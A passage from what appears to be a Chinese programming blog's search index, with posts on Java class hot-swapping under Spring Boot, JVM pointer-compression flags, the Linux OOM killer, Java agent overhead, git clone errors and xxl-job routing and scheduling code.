[jetty-io-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:103) [jetty-io-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:117) [jetty-io-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:781) [jetty-util-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:917) [jetty-util-9.4.19.v20190610.jar!/:9.4.19.v20190610]  at java.lang.Thread.run(Thread.java:748) [na:1.8.0_171] Caused by: java.lang.ClassFormatError: Truncated class file  at java.lang.ClassLoader.defineClass1(Native Method) ~[na:1.8.0_171]  at java.lang.ClassLoader.defineClass(ClassLoader.java:763) ~[na:1.8.0_171]  at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142) ~[na:1.8.0_171] at java.net.URLClassLoader.defineClass(URLClassLoader.java:467) ~[na:1.8.0_171]  at java.net.URLClassLoader.access$100(URLClassLoader.java:73) ~[na:1.8.0_171]  at java.net.URLClassLoader$1.run(URLClassLoader.java:368) ~[na:1.8.0_171]  at java.net.URLClassLoader$1.run(URLClassLoader.java:362) ~[na:1.8.0_171]  at java.security.AccessController.doPrivileged(Native Method) ~[na:1.8.0_171]  at java.net.URLClassLoader.findClass(URLClassLoader.java:361) ~[na:1.8.0_171]  at java.lang.ClassLoader.loadClass(ClassLoader.java:424) ~[na:1.8.0_171]  at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ~[na:1.8.0_171]  at com.stone.jdk.demohotswap.DemoHotswapApplication.swap(DemoHotswapApplication.java:64) ~[classes!/:0.0.1-SNAPSHOT]  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_171]  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_171]  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_171]  at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_171]  at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:892) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1039) ~[spring-webmvc-5.1.9.RELEASE.jar!/:5.1.9.RELEASE]  ... 46 common frames omitted 重现步骤如下 git clone https://github.com/shidongwa/demo-hotswap.git cd demo-hotswap mvn clean package copy demo.war to you workspace build and move test.jar to /tmp jar cvf test.jar com/stone/jdk/demohotswap/swapClass/SwapMe.class cp test.jar /tmp/ run demo.war in this way java -jar demo.war access endpoint http://localhost:8080/swap update SwapMe.java, package and replace test.jar access endpoint http://localhost:8080/swap again 上面的异常出现 注意： 如果以这种方式启动 java -cp jetty-runner-9.4.14.v20181114.jar org.eclipse.jetty.runner.Runner demo.war 不会有问题。 问题分析 比较下面两种jetty启动方式 java -jar demo.war 是以Spring boot WarLauncher方式加载fat jar java -cp jetty-runner-9.4.14.v20181114.jar org.eclipse.jetty.runner.Runner demo.war 方式启动看当前线程ClassLoader是WebAppClassLoader而不是Spring boot LaunchedClassLoader 对应fat jar加载时打印jarFile url connection 是 jarURLConnection:org.springframework.boot.loader.jar.JarURLConnection:jar:file:/tmp/test.jar!/ 对应jetty runner加载时打印jarFile url connetion 是jarURLConnection:sun.net.www.protocol.jar.JarURLConnection:jar:file:/tmp/test.jar!/ 可以看出两种启动方式对应URLClassLoader加载jarFile的方式不同 从Spring boot社区看考虑性能问题，Spring boot loader不支持动态更新加载的jar文件。参考：https://github.com/spring-projects/spring-boot/issues/15964 问题解决 我们自定义URLClassLoader和Spring Boot fat jar是隔离和分开打包的。 通过在URLClassLoader加载jar包时指定sun.net.www.protocol.jar.Handler可以解决Spring boot org.springframework.boot.loader.jar.JarURLConnection不能热更的问题。 参考 https://github.com/shidongwa/demo-hotswap ",
      "url"      : "http://localhost:4000/2019/09/22/custom-ClassLoader/"
    } ,
  
    {
      "title"    : "linux主机性能查看工具",
      "category" : "操作系统",
      "content": "linux平台下查看主机系统性能的工具列表 ",
      "url"      : "http://localhost:4000/2019/11/03/linux-perf-tool/"
    } ,
  
    {
      "title"    : "-XX:+UseCompressedOops 与 -XX:+UseCompressedClassPointers",
      "category" : "JVM",
      "content": "64位操作系统中Java8 启动时支持的这两个启动参数有什么区别呢？ 背景 这两个启动参数经常用在JVM性能调优，因为他们会影响内存中对象占用大小。 分析 java对象内存模型可以描述为：OOP-Klass OOP：Ordinary Object Point。这部分是所有此类对象的不同部分（对象属性指针，类属性指针，普通对象数组的每个元素指针） Klass：指向类元数据信息比如方法，属性等。这部分是所有此类对象相同部分 此外还包括Markword头，数组大小（如果有的话） padding（8字节对齐） 这里OOP对于参数-XX:+UseCompressedOops，Klass对应-XX:+UseCompressedClassPointers。注意Java8中增加了两块内存空间 metaspace 代替 perm generation space compressed class space只有开启了UseCompressedClassPointers后 /** * -XX:+UseCompressedOops: mark/8 + Klass/8 = 16 * -XX:-UseCompressedOops: mark/8 + Klass/4 + padding/4 = 16 */  static class X1 {  } &lt;span class=&quot;cm&quot;&gt;/** * -XX:+UseCompressedOops: mark/8 + Klass/4 + a/4 = 16 * -XX:-UseCompressedOops: mark/8 + Klass/8 + a/4 + padding/4 = 24 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * -XX:+UseCompressedOops: mark/8 + Klass/4 + i/4 = 16 * -XX:-UseCompressedOops: mark/8 + Klass/8 + i/8 = 24 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * -XX:+UseCompressedOops: mark/8 + Klass/4 + size/4 = 16 * -XX:-UseCompressedOops: mark/8 + Klass/8 + size/4 + padding/4 = 24 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * -XX:+UseCompressedOops: mark/8 + Klass/4 + size/4 = 16 * -XX:-UseCompressedOops: mark/8 + Klass/8 + size/4 + padding/4 = 24 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** * -XX:+UseCompressedOops: mark/8 + Klass/4 + i/4 + l/8 + d/8 = 32 * -XX:-UseCompressedOops: mark/8 + Klass/8 + i/4 + l/8 + d/8 + padding/4= 40 */&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 参考 Java Agent ",
      "url"      : "http://localhost:4000/2019/11/17/JVM-para/"
    } ,
  
    {
      "title"    : "OOM Killer",
      "category" : "操作系统",
      "content": "进程为什么无故者被杀掉或重启？ 背景 调查问题过程中有时发现自己的进程无缘故被杀掉了或者多次重启（配置supervisord自动拉起）。这种情况可以查看是否是操作系统OOM killer干的。一般可以查看系统日志文件/var/log/messages中是否有这样的信息 Out of Memory: Kill process 1865（java） 分析 内核会通过特定的算法给每个进程计算一个分数来决定杀哪个进程，每个进程的oom分数可以从/proc/PID/oom_score中看到。 进程运行时有一个参数oom_adj可以调整oom_score。oom_adj的可调值为15到-16，其中15最大-16最小，-17为禁止使用OOM。oom_score为2的n次方计算出来的，其中n就是进程的oom_adj值，所以oom_score的分数越高就越会被内核优先杀掉。 进程避免OOM Kill 还是要看程序内存处理是否合理。 ",
      "url"      : "http://localhost:4000/2019/11/17/OOM-killer/"
    } ,
  
    {
      "title"    : "Java Agent对系统性能的影响有多大",
      "category" : "JVM",
      "content": "Java Agent对原有Java应用程序性能影响有多大？ 背景 现有基于Java Agent的产品比如APM(Application Performance Management)、诊断工具、跟踪工具、测试平台一般声称他们产品对系统性能影响大概是X%。事实上，Java Agent对原始Java应用程序的影响真的可以用一个简单的数字表示么？网上有篇文章Lies, damn lies and “our performance overhead is 2%”分析的比较有意思，下文主要是参考原始作者的文章进行阐述。 系统资源损耗 业务应用避免系统资源耗尽。引起这种问题的原因可能是业务应用本身，可能是Java Agent，也可能是同台主机上的其他进程。 CPU 需要加入限流（throttling）机制，或者计算放到另外的主机服务器上进行，同注入的Java进程隔离。 内存 堆内内存+堆外内存（本地内存）损耗，甚至可能引起OOM Killer直接杀掉内存占用大的进程。 磁盘空间和磁盘I/O 避免日志文件把磁盘空间撑爆了 网络I/O 对应采集数据并上报的Java agent需要避免过多占用网络带宽。考虑高效的数据结构或者压缩数据或者采样等。 常见问题 GC Java Agent逻辑中new了堆对象。这些对象会增加GC的频率和STW的时间，影响系统吞掉量和响应时间。比如java agent修改的是一个Http请求的入口类，并获取Http header已经请求参数，如果按照流行的greys的SPY方式，是会创建很多的对象。 破坏JIT优化 Java Agent动态改名运行时Java应用的字节码会破坏JIT优化。简单的例子比如增加方法的大小，会影响内联（inlining）优化。另外一个是逃逸分析（Escape Analysis）。简单来说，就是堆对象栈上分配。如果java agent中用到了堆上对象就不会进行栈上分配的优化了。 更多 结论 不要相信产品提供的通用数字。在自己的环境，打开和关闭Java Agent，测试对比系统性能比如吞吐量/延迟/TPS等。 ",
      "url"      : "http://localhost:4000/2019/11/23/Java-Agent-performance/"
    } ,
  
    {
      "title"    : "github clone RPC failed",
      "category" : "git",
      "content": "github clone 异常 error: RPC failed; curl 18 transfer closed with outstanding read data remaining 最近从github中clone项目时经常遇到下面异常。 ╰─$ git clone https://github.com/shidongwa/xxl-job.git Cloning into 'xxl-job'... remote: Enumerating objects: 14703, done. error: RPC failed; curl 18 transfer closed with outstanding read data remaining fatal: the remote end hung up unexpectedly fatal: early EOF fatal: index-pack failed 参考stackoverflow中解决方法加入 depth=1 仍然没有卯用。报 RPC failed; curl 56 LibreSSL SSL_read: SSL_ERROR_SYSCALL ╭─donghua@ ~/git-project ╰─$ git clone https://github.com/shidongwa/xxl-job.git --depth=1 Cloning into 'xxl-job'... remote: Enumerating objects: 532, done. remote: Counting objects: 100% (532/532), done. remote: Compressing objects: 100% (432/432), done. RPC failed; curl 56 LibreSSL SSL_read: SSL_ERROR_SYSCALL 继续参考stackoverflow 下载还是很慢。我用的时ss代理。关闭代理直连问题一样。用码云gitee非常快但是要所有项目都从github切换到码云也不是个事。 没有找到最终解决方案，建议下面的方式缓解一下 // 只clone git history中最近1个版本的文件，可以节省传输和存储的文件大小 // ssh代替http方式 // git config --global http.postBuffer 157286400 这种方式没有明显效果 git clone git@github.com:xuxueli/xxl-job.git --depth=1 ",
      "url"      : "http://localhost:4000/2020/10/13/github-clone-fail/"
    } ,
  
    {
      "title"    : "xxl-job中选择执行节点路由策略分析",
      "category" : "分布式job",
      "content": "读xxl-job源码分析如何选择/路由执行节点。其中一个策略是一致性hash。 分析 xxl-job中的一致性hash路由策略还是蛮简单的。根据jobId和执行器地址列表来做路由即可。 执行器地址（ip:port) hash到TreeMap 为了避免增减节点时负载不均衡，加入虚拟节点。每个物理节点虚拟为100个虚拟节点分散到TreeMap中 重写Hash算法避免原生hash算法不均衡问题 采用TreeMap的tailMap功能找到大于等于当前hash值的节点 package com.xxl.job.admin.core.route.strategy; import com.xxl.job.admin.core.route.ExecutorRouter; import com.xxl.job.core.biz.model.ReturnT; import com.xxl.job.core.biz.model.TriggerParam; import java.io.UnsupportedEncodingException; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; import java.util.List; import java.util.SortedMap; import java.util.TreeMap; /** 分组下机器地址相同，不同JOB均匀散列在不同机器上，保证分组下机器分配JOB平均；且每个JOB固定调度其中一台机器； a、virtual node：解决不均衡问题 b、hash method replace hashCode：String的hashCode可能重复，需要进一步扩大hashCode的取值范围 Created by xuxueli on 17/3/10. */ public class ExecutorRouteConsistentHash extends ExecutorRouter { private static int VIRTUAL_NODE_NUM = 100; /** get hash code on 2^32 ring (md5散列的方式计算hash值) @param key @return */ private static long hash(String key) { // md5 byte MessageDigest md5; try { md5 = MessageDigest.getInstance(&quot;MD5&quot;); } catch (NoSuchAlgorithmException e) { throw new RuntimeException(&quot;MD5 not supported&quot;, e); } md5.reset(); byte[] keyBytes = null; try { keyBytes = key.getBytes(&quot;UTF-8&quot;); } catch (UnsupportedEncodingException e) { throw new RuntimeException(&quot;Unknown string :&quot; + key, e); } md5.update(keyBytes); byte[] digest = md5.digest(); // hash code, Truncate to 32-bits long hashCode = ((long) (digest[3] &amp; 0xFF) &lt;&lt; 24) | ((long) (digest[2] &amp; 0xFF) &lt;&lt; 16) | ((long) (digest[1] &amp; 0xFF) &lt;&lt; 8) | (digest[0] &amp; 0xFF); long truncateHashCode = hashCode &amp; 0xffffffffL; return truncateHashCode; } public String hashJob(int jobId, List&lt;String&gt; addressList) { &lt;span class=&quot;c1&quot;&gt;// ------A1------A2-------A3------&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// -----------J1------------------&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TreeMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addressRing&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TreeMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;();&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;address:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addressList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;VIRTUAL_NODE_NUM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addressHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SHARD-&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-NODE-&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;addressRing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addressHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jobHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SortedMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lastRing&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addressRing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;tailMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobHash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lastRing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lastRing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lastRing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;firstKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addressRing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;firstEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getValue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; } @Override public ReturnT&lt;String&gt; route(TriggerParam triggerParam, List&lt;String&gt; addressList) { String address = hashJob(triggerParam.getJobId(), addressList); return new ReturnT&lt;String&gt;(address); } } 后记 之所以关注这个逻辑是因为线上运行xxl-job时有时候job会不调度了，不确定是因为应用发版还是进程假死（FULL GC频繁）引起的。理想情况下被调用的执行器有问题时会路由到健康的执行器上去。 ",
      "url"      : "http://localhost:4000/2020/10/15/xxl-job-route-strategy/"
    } ,
  
    {
      "title"    : "xxl-job中时间调度策略",
      "category" : "分布式xxl-job",
      "content": "最新版本xxl-job中调度部分没有采用quartz，而是线程+timewheel 这部分代码位于xxl-job-admin项目中。基本思路是通过ConcurrentHashMap作为timewheel记录每秒处理的jobId列表。 scheduleThread while循环从DB中轮询jobId触发时间是否到了 到的话立即执行 超过5s不执行，更新下次触发时间 5s以内放入timewheel中秒对应的槽位 ringThread中while循环轮询当前秒对应槽位中jobId列表并执行 ringThread中有些优化：比如秒对齐，向前多取一个槽位等 package com.xxl.job.admin.core.thread; import com.xxl.job.admin.core.conf.XxlJobAdminConfig; import com.xxl.job.admin.core.cron.CronExpression; import com.xxl.job.admin.core.model.XxlJobInfo; import com.xxl.job.admin.core.trigger.TriggerTypeEnum; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import java.sql.Connection; import java.sql.PreparedStatement; import java.sql.SQLException; import java.text.ParseException; import java.util.*; import java.util.concurrent.ConcurrentHashMap; import java.util.concurrent.TimeUnit; /** @author xuxueli 2019-05-21 */ public class JobScheduleHelper { private static Logger logger = LoggerFactory.getLogger(JobScheduleHelper.class); private static JobScheduleHelper instance = new JobScheduleHelper(); public static JobScheduleHelper getInstance(){ return instance; } public static final long PRE_READ_MS = 5000; // pre read private Thread scheduleThread; private Thread ringThread; private volatile boolean scheduleThreadToStop = false; private volatile boolean ringThreadToStop = false; private volatile static Map&lt;Integer, List&lt;Integer&gt;&gt; ringData = new ConcurrentHashMap&lt;&gt;(); public void start(){ &lt;span class=&quot;c1&quot;&gt;// schedule thread&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleThread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Runnable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;MILLISECONDS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span 